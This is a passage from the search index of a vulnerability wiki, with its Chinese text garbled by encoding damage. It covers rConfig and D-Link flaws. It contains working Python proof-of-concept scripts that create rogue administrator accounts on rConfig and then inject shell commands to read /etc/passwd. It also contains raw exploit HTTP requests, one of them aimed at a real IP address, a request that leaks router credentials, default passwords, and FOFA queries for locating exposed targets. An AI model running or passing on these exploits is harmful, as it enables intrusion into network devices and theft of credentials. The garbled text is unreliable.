\" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; Ê≤°Êúâ‰ΩøÁî®ËøáÊª§Áõ¥Êé•ÊãºÊé•ÂëΩ‰ª§ÔºåÂØºËá¥ÂëΩ‰ª§ÊâßË°åÔºåÂπ∂Âõ†‰∏∫sudoËÄårootÊùÉÈôêÊâßË°åÔºåÁî±‰∫éÊòØÂêéÂè∞ÊºèÊ¥ûÊâÄ‰ª•ÈúÄË¶ÅÁôªÂΩïÔºåÈÖçÂêà‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÂèØ‰ª•RCE ËØ∑Ê±ÇÂåÖ‰∏∫ GET /lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;ls%3E../../test.txt HTTP/1.1 Host: Cookie: cookname=testtest; cookid=a13be657db5e18e453c66c564467b0f2; PHPSESSID=lr7j5r2beat1eprpklrhiorq71 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 2 ÂÜçËØ∑Ê±Ç http://xxx.xxx.xxx.xxx/test.txt È™åËØÅÊºèÊ¥û ÊºèÊ¥ûPOC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from requests_toolbelt.multipart.encoder import MultipartEncoder def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: rConfig userprocess.php ‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/lib/crud/userprocess.php\" referer = target_url + \"useradmin.php\" ran_number = random.randint(1, 999) origin = target_url multipart_data = MultipartEncoder( fields={ 'username': 'testtest{}'.format(ran_number), 'password': 'testtest@{}'.format(ran_number), 'passconf': 'testtest@{}'.format(ran_number), 'email': 'testtest{}@test.com'.format(ran_number), 'ulevelid': '9', 'add': 'add', 'editid': '' } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\": origin} cookies = {'PHPSESSID': 'test'} try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: username = 'testtest{}'.format(ran_number) password = 'testtest@{}'.format(ran_number) print(\"\\033[36m[o] ÊàêÂäüÂàõÂª∫Ë¥¶Êà∑ testtest{}/testtest@{} \\033[0m\".format(ran_number, ran_number)) POC_2(target_url, username, password) else: print(\"\\033[31m[x] ÂàõÂª∫Â§±Ë¥•:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, username, password): print(\"\\033[36m[o] Ê≠£Âú®ÁôªÈôÜË¥¶Êà∑..... \\033[0m\") vuln_url = target_url + \"/lib/crud/userprocess.php\" headers = { 'Content-Type': \"application/x-www-form-urlencoded; charset=UTF-8\", \"Referer\": target_url + \"deviceConnTemplates.php\", \"Origin\": target_url, \"X-Requested-With\": \"XMLHttpRequest\", \"Accept-Language\": \"en-US,en;q=0.5\" } data = { 'user': username, 'pass': password, 'sublogin': '1' } try: response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) print(\"\\033[36m[o] Ê≠£Âú®Â∞ùËØïÊâßË°å cat /etc/passwd.....\\033[0m\") with requests.Session() as s: p = s.post(target_url + '/lib/crud/userprocess.php', data=data, verify=False) if \"Stephen Stack\" in p.text: print(\"\\033[31m[x] ÁôªÂΩïÂ§±Ë¥• \\033[0m\") else: rce = s.get(target_url + '/lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;cat%20/etc/passwd%3E../../test.txt', verify=False, headers=headers) if \"success\" in rce.text: response = s.get(target_url + '/test.txt', verify=False) print(\"\\033[36m[o] ÊàêÂäüÊâßË°å cat /etc/passwd, ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/rConfig/rConfig userprocess.php ‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/rConfig/rConfig userprocess.php ‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥û.html","title":"rConfig userprocess.php ‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥û","keywords":"","body":"rConfig userprocess.php ‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ rConfig userprocess.php Â≠òÂú®‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥ûÔºåÂèëÈÄÅÁâπÂÆöÁöÑËØ∑Ê±ÇÂåÖÊîªÂáªËÄÖÂèØ‰ª•ÂàõÂª∫ÁÆ°ÁêÜÂëòË¥¶Êà∑ÁôªÂΩïÂêéÂè∞ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] rConfig FOFA [!NOTE] app=\"rConfig\" ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂‰∏∫ userproce.php procLogin(); } /* Admin submitted user add form */ else if (isset($_POST['add']) && isset($_POST['editid']) && empty($_POST['editid'])) { $this->procRegister(); } /* Admin submitted user edit form */ else if (isset($_POST['add']) && isset($_POST['editid']) && !empty($_POST['editid'])) { $this->procUpdateAccount(); } /* User submitted forgot password form */ else if (isset($_POST['subforgot'])) { $this->procForgotPass(); } /* User submitted edit account form */ else if (isset($_POST['subedit'])) { $this->procEditAccount(); } /** * The only other reason user should be directed here * is if he wants to logout, which means user is * logged in currently. */ else if ($session->logged_in) { $this->procLogout(); } /** * Should not get here, which means user is viewing this page * by mistake and therefore is redirected. */ else { header(\"Location: /login.php\"); } } /** * procLogin - Processes the user submitted login form, if errors * are found, the user is redirected to correct the information, * if not, the user is effectively logged in to the system. */ function procLogin() { global $session, $form; /* Login attempt */ $retval = $session->login($_POST['user'], $_POST['pass'], isset($_POST['remember'])); /* Login successful */ if ($retval) { header(\"Location: \" . $session->referrer); } /* Login failed */ else { $_SESSION['value_array'] = $_POST; $_SESSION['error_array'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer); } } /** * procLogout - Simply attempts to log the user out of the system * given that there is no logout form to process. */ function procLogout() { global $session; $retval = $session->logout(); header(\"Location: /login.php\"); } /** * procRegister - Processes the user submitted registration form, * if errors are found, the user is redirected to correct the * information, if not, the user is effectively registered with * the system and an email is (optionally) sent to the newly * created user. */ function procRegister() { global $session, $form; /* Convert username to all lowercase (by option) */ if (ALL_LOWERCASE) { $_POST['username'] = strtolower($_POST['username']); } /* Registration attempt */ $retval = $session->register($_POST['username'], $_POST['password'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Registration Successful */ if ($retval == 0) { $_SESSION['reguname'] = $_POST['username']; $_SESSION['regsuccess'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully added to Database\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['reguname'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be added to Database\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } } /** * procForgotPass - Validates the given username then if * everything is fine, a new password is generated and * emailed to the address the user gave on sign up. */ function procForgotPass() { global $database, $session, $mailer, $form; /* Username error checking */ $subuser = $_POST['user']; $field = \"user\"; //Use field name for username if (!$subuser || strlen($subuser = trim($subuser)) == 0) { $form->setError($field, \"Username not entered\"); $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } else { /* Make sure username is in database */ $subuser = stripslashes($subuser); if (strlen($subuser) 30 || !preg_match(\"/^([0-9a-z])+$/\", $subuser) || (!$database->usernameTaken($subuser))) { $form->setError($field, \"Unknown Username\"); $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } } /* Errors exist, have user correct them */ if ($form->num_errors > 0) { $_SESSION['value_array'] = $_POST; $_SESSION['error_array'] = $form->getErrorArray(); } else { /* Generate new password */ $newpass = $session->generateRandStr(8); /* Get email of user */ $usrinf = $database->getUserInfo($subuser); $email = $usrinf['email']; /* Attempt to send the email with new password */ if ($mailer->sendNewPass($subuser, $email, $newpass)) { /* Email sent, update database */ $database->updateUserField($subuser, \"password\", md5($newpass)); echo \"\" . \"alert('Your new password has been generated. The password was emailed to $email');\" . \"window.close();\" . \"\"; }/* Email failure, do not change password */ else { $_SESSION['forgotpass'] = false; } } } /** * procEditAccount - Attempts to edit the user's account * information, including the password, which must be verified * before a change is made. */ function procEditAccount() { global $session, $form; /* Account edit attempt */ $retval = $session->editAccount($_POST['editid'], $_POST['username'], $_POST['curpass'], $_POST['newpass'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Account edit successful */ if ($retval == 0) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['useredit'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $session->referrer . \"?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $session->referrer); } } /** * procEditAccount - Attempts to edit the user's account * information, including the password, which must be verified * before a change is made. */ function procUpdateAccount() { // http or https check for url Protocol $protocol = 'http'; if (isset($_SERVER['HTTPS'])) { if (strtoupper($_SERVER['HTTPS']) == 'ON') { $protocol = 'https'; } } global $session, $form; /* Account edit attempt */ $retval = $session->updateAccount($_POST['editid'], $_POST['username'], $_POST['password'], $_POST['passconf'], $_POST['email'], $_POST['ulevelid']); /* Account edit successful */ if ($retval == 0) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['useredit'] = true; $errors['Success'] = \"User \" . $_POST['username'] . \" successfully edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $protocol . \"://\" . $_SERVER['HTTP_HOST'] . \"/\" . \"useradmin.php\"); } /* Error found with form */ else if ($retval == 1) { $_SESSION['value_array'] = $_POST; $_SESSION['errors'] = $form->getErrorArray(); header(\"Location: \" . $protocol . \"://\" . $_SERVER['HTTP_HOST'] . \"/\" . \"useradmin.php?error\"); } /* Registration attempt failed */ else if ($retval == 2) { $_SESSION['useredit'] = $_POST['username']; $_SESSION['regsuccess'] = false; $errors['Fail'] = \"ERROR: User \" . $_POST['username'] . \" could not be edited\"; $_SESSION['errors'] = $errors; header(\"Location: \" . $protocol . \"://\" . $_SERVER['HTTP_HOST'] . \"/\" . \"useradmin.php\"); } } } /* Initialize process */ $process = new Process; Âá∫Áé∞ÊºèÊ¥ûÁöÑÂéüÂõ†ÊòØÂØπÊùÉÈôêËÆæÂÆöÈîôËØØÔºå‰ªª‰Ωï‰∫∫ÈÉΩÂèØ‰ª•ÈÄöËøáËÆøÈóÆËøô‰∏™Êñá‰ª∂ÂàõÂª∫ÁÆ°ÁêÜÂëòÁî®Êà∑ ÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±ÇÂåÖÂàõÂª∫ÁÆ°ÁêÜÂëòÁî®Êà∑ testtestÔºåÂØÜÁ†Å‰∏∫ testtest@123 POST /lib/crud/userprocess.php HTTP/1.1 Host: 194.149.41.11 User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: multipart/form-data; boundary=b1467349fcce4aa0ae8d44439f4e06bc Upgrade-Insecure-Requests: 1 Referer: http://194.149.41.11/useradmin.php Origin: http://194.149.41.11/ Cookie: PHPSESSID=test Content-Length: 697 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"username\" testtest --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"password\" testtest@123 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"passconf\" testtest@123 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"email\" testtest@test.com --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"ulevelid\" 9 --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"add\" add --b1467349fcce4aa0ae8d44439f4e06bc Content-Disposition: form-data; name=\"editid\" --b1467349fcce4aa0ae8d44439f4e06bc-- ÊàêÂäüÂàõÂª∫Áî®Êà∑ testtestÔºå‰ª•ÁÆ°ÁêÜÂëòË∫´‰ªΩÁôªÂΩïÂêéÂè∞ ÊºèÊ¥ûPOC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from requests_toolbelt.multipart.encoder import MultipartEncoder def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: rConfig userprocess.php ‰ªªÊÑèÁî®Êà∑ÂàõÂª∫ÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/lib/crud/userprocess.php\" referer = target_url + \"useradmin.php\" ran_number = random.randint(1, 999) origin = target_url multipart_data = MultipartEncoder( fields={ 'username': 'testtest{}'.format(ran_number), 'password': 'testtest@{}'.format(ran_number), 'passconf': 'testtest@{}'.format(ran_number), 'email': 'testtest{}@test.com'.format(ran_number), 'ulevelid': '9', 'add': 'add', 'editid': '' } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, \"Origin\": origin} cookies = {'PHPSESSID': 'testtest{}'.format(ran_number)} print(\"\\033[36m[o] Ê≠£Âú®ÂàõÂª∫Ë¥¶Êà∑..... \\033[0m\".format(ran_number, ran_number)) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, allow_redirects=False) if \"error\" not in response.text: print(\"\\033[36m[o] ÊàêÂäüÂàõÂª∫Ë¥¶Êà∑ testtest{}/testtest@{} \\033[0m\".format(ran_number, ran_number)) else: print(\"\\033[31m[x] ÂàõÂª∫Â§±Ë¥•:{} \\033[0m\") except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥•:{} \\033[0m\".format(e)) sys.exit(0) # if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/rConfig/rConfig ajaxEditTemplate.php ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/rConfig/rConfig ajaxEditTemplate.php ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å.html","title":"rConfig ajaxEditTemplate.php ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å","keywords":"","body":"rConfig ajaxEditTemplate.php ÂêéÂè∞ËøúÁ®ãÂëΩ‰ª§ÊâßË°å Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/rConfig/rConfig useradmin.inc.php ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/rConfig/rConfig useradmin.inc.php ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.html","title":"rConfig useradmin.inc.php ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"rConfig useradmin.inc.php ‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ rConfig useradmin.inc.php Â≠òÂú®‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥ûÔºåÈÄöËøáËÆøÈóÆÊñá‰ª∂Ëé∑ÂèñÁî®Êà∑ÈÇÆÁÆ±‰ø°ÊÅØÂíåÁôªÂΩïÂêç ÊºèÊ¥ûÂΩ±Âìç [!NOTE] rConfig FOFA [!NOTE] app=\"rConfig\" ÊºèÊ¥ûÂ§çÁé∞ Âá∫Áé∞ÊºèÊ¥ûÁöÑÊñá‰ª∂ query(\"SELECT timeZone FROM settings\"); $result = $db2->resultsetCols(); $timeZone = $result[0]; date_default_timezone_set($timeZone); /* Get Row count from users where NOT deleted */ $db2->query('SELECT COUNT(*) AS total FROM users WHERE status = 1'); $row = $db2->resultsetCols(); $result[\"total\"] = $row[0]; /* Instantiate Paginator Class */ $pages = new Paginator; $pages->items_total = $result['total']; $pages->mid_range = 7; // Number of pages to display. Must be odd and > 3 $pages->paginate(); echo $pages->display_pages(); echo \"\" . $pages->display_jump_menu() . $pages->display_items_per_page() . \"\"; /* GET all nodes records from DB */ $db2->query(\"SELECT id, username, userlevel, email, timestamp FROM users WHERE status = 1 $pages->limit\"); $resultSelect = $db2->resultset(); // push rows to $itesm array $items = array(); foreach ($resultSelect as $row) { array_push($items, $row); } /* Create Multidimensional array for use later */ $result[\"rows\"] = $items; $i = 0; # row counter to enable alternate row coloring ?> Username E-mail User Level Last Login '; ?> \"/> display_pages(); echo \"\"; echo \"Page: $pages->current_page of $pages->num_pages\\n\"; Êñá‰ª∂Ê≤°ÊúâËÆæÂÆöÊùÉÈôêÔºå‰ªª‰Ωï‰∫∫ÂèØ‰ª•ËÆøÈóÆÊ≥ÑÈú≤‰ø°ÊÅØ ÊºèÊ¥ûÈ™åËØÅÁöÑUrl‰∏∫ /useradmin.inc.php Ê≥ÑÈú≤Áî®Êà∑‰ø°ÊÅØ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/","title":"D-Link","keywords":"","body":"D-Link D-Link ACÁÆ°ÁêÜÁ≥ªÁªüÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å D-Link Dir-645 getcfg.php Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û CVE-2019-17506 D-Link DSL-28881A FTPÈÖçÁΩÆÈîôËØØ CVE-2020-24578 D-Link DSL-28881A Êú™ÊéàÊùÉËÆøÈóÆ CVE-2020-24579 D-Link DSL-28881A ‰ø°ÊÅØÊ≥ÑÈú≤ CVE-2020-24577 D-Link DSL-28881A ËøúÁ®ãÂëΩ‰ª§ÊâßË°å CVE-2020-24581 D-Link DCSÁ≥ªÂàóÁõëÊéß Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û CVE-2020-25078 D-Link ShareCenter DNS-320 system_mgr.cgi ËøúÁ®ãÂëΩ‰ª§ÊâßË°å Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link ACÁÆ°ÁêÜÁ≥ªÁªüÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link ACÁÆ°ÁêÜÁ≥ªÁªüÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å.html","title":"D-Link ACÁÆ°ÁêÜÁ≥ªÁªüÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å","keywords":"","body":"D-Link ACÁÆ°ÁêÜÁ≥ªÁªüÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†Å ÊºèÊ¥ûÊèèËø∞ D-Link ACÁÆ°ÁêÜÁ≥ªÁªüÂ≠òÂú®ÈªòËÆ§Ë¥¶Âè∑ÂØÜÁ†ÅÔºåÂèØË¢´Ëé∑ÂèñÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] D-Link ACÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] \"ACÈõÜ‰∏≠ÁÆ°ÁêÜÂπ≥Âè∞\" && body=\"D-LinkË∑ØÁî±Âô®ÁÆ°ÁêÜÈ°µ\" ÊºèÊ¥ûÂ§çÁé∞ ÈªòËÆ§Âè£‰ª§‰∏∫ admin:admin Goby & POC [!NOTE] Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ D_Link_AC_Centralized_management_system__Default_weak_password.json Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link Dir-645 getcfg.php Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û CVE-2019-17506.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link Dir-645 getcfg.php Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û CVE-2019-17506.html","title":"D-Link Dir-645 getcfg.php Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û CVE-2019-17506","keywords":"","body":"D-Link Dir-645 getcfg.php Ë¥¶Âè∑ÂØÜÁ†ÅÊ≥ÑÈú≤ÊºèÊ¥û CVE-2019-17506 ÊºèÊ¥ûÊèèËø∞ D-Link DIR-868L B1-2.03ÂíåDIR-817LW A1-1.04Ë∑ØÁî±Âô®‰∏äÊúâ‰∏Ä‰∫õ‰∏çÈúÄË¶ÅË∫´‰ªΩÈ™åËØÅÁöÑWebÁïåÈù¢„ÄÇÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáSERVICESÁöÑDEVICE.ACCOUNTÂÄº‰ª•ÂèäAUTHORIZED_GROUP = 1ÔºÖ0aÊù•Ëé∑Âèñgetcfg.phpÁöÑË∑ØÁî±Âô®ÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÔºà‰ª•ÂèäÂÖ∂‰ªñ‰ø°ÊÅØÔºâ„ÄÇËøôÂèØÁî®‰∫éËøúÁ®ãÊéßÂà∂Ë∑ØÁî±Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] D-Link Dir Á≥ªÂàóÂ§ö‰∏™ÁâàÊú¨ FOFA [!NOTE] app=\"D_Link-DIR-868L\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂèëÈÄÅÂ¶Ç‰∏ãËØ∑Ê±ÇÂåÖ POST /getcfg.php HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Content-Length: 61 SERVICES=DEVICE.ACCOUNT&attack=ture%0D%0AAUTHORIZED_GROUP%3D1 Ëé∑ÂèñÂà∞Ë∑ØÁî±Âô®Ë¥¶Âè∑ÂØÜÁ†ÅÂç≥ÂèØÁôªÂΩïÂêéÂè∞ Goby & POC Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link DSL-28881A ‰ø°ÊÅØÊ≥ÑÈú≤ CVE-2020-24577.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link DSL-28881A ‰ø°ÊÅØÊ≥ÑÈú≤ CVE-2020-24577.html","title":"D-Link DSL-28881A ‰ø°ÊÅØÊ≥ÑÈú≤ CVE-2020-24577","keywords":"","body":"D-Link DSL-28881A ‰ø°ÊÅØÊ≥ÑÈú≤ CVE-2020-24577 ÊºèÊ¥ûÊèèËø∞ ÈÄöËøáÁâ©ÁêÜËøûÊé•ÊàñÊó†Á∫øËÆøÈóÆÂª∫Á´ã‰∏éÁΩëÁªúÁöÑËøûÊé•ÂêéÔºåÊÅ∂ÊÑèÁî®Êà∑ÂèØ‰ª•ÈÄöËøáÁõ¥Êé•ÊµèËßà‰ª•‰∏ãURLÊù•Ëé∑ÂèñÁ∫ØÊñáÊú¨Ê†ºÂºèÁöÑInternetÊèê‰æõÂïÜËøûÊé•Áî®Êà∑ÂêçÂíåÂØÜÁ†ÅÔºå‰ª•ÂèäÊó†Á∫øË∑ØÁî±Âô®ÁöÑÁ∫ØÊñáÊú¨Ê†ºÂºèÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†Å ÊºèÊ¥ûÂΩ±Âìç [!NOTE] D-Link DSL-2888A FOFA [!NOTE] body=\"DSL-2888A\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢ËæìÂÖ•‰ªªÊÑèÂØÜÁ†ÅÂª∫Á´ãËøûÊé• Ë∑≥ËΩ¨Âà∞ http://xxx.xxx.xxx.xxx/page/login/login.html?error=fail ÊòæÁ§∫ÂØÜÁ†ÅÈîôËØØ ËÆøÈóÆ‰∏ãÂàó‰∏§‰∏™ËøûÊé• http://xxx.xxx.xxx.xxx:8008/tmp/cfg/lib_cfg_cfgcmd http://xxx.xxx.xxx.xxx:8008/tmp/.nvram [!NOTE] ËøûÊé•WiflÊàñÁâ©ÁêÜËøûÊé•WifiÊâçËÉΩËÆøÈóÆ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link DSL-28881A FTPÈÖçÁΩÆÈîôËØØ CVE-2020-24578.html":{"url":"book/ÁΩëÁªúËÆæÂ§áÊºèÊ¥û/D-Link/D-Link DSL-28881A FTPÈÖçÁΩÆÈîôËØØ CVE-2020-24578.html","title":"D-Link DSL-28881A FTPÈÖçÁΩÆÈîôËØØ CVE-2020-24578","keywords":"","body":"D-Link DSL-28881A 